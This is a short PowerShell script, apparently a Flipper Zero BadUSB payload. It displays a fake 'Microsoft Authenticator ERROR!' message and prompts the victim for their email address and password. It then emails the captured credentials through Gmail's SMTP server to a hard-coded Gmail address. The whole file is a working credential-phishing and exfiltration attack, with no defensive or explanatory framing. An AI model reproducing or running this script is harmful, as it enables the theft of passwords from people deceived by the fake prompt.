clear
$mycredentials = Get-Credential
Write-Host "Microsoft Authenticator ERROR! To continue enter your e-mail address and password."

$name = Read-Host "Email Address"
$pwd = Read-Host "Password"


Send-MailMessage -SmtpServer smtp.gmail.com -Port 587 -UseSsl -From davidwoodbridgeca@gmail.com -To davidwoodbridgeca@gmail.com -Subject 'Hello from Flipper' -Body ("$name $pwd") -Credential ($mycredentials)
exit
